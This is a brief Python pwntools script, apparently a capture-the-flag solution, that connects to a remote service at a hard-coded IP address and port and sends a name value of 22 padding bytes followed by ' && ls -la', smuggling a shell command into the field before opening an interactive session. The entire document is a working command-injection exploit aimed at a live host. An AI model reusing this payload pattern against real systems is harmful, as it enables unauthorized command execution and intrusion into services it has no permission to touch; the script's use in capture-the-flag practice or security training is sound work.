from pwn import *

p = remote('103.162.14.116', 12009)
payload = 'b'*22 + ' && ls -la'
p.sendafter(b'name: ', payload.encode())

p.interactive()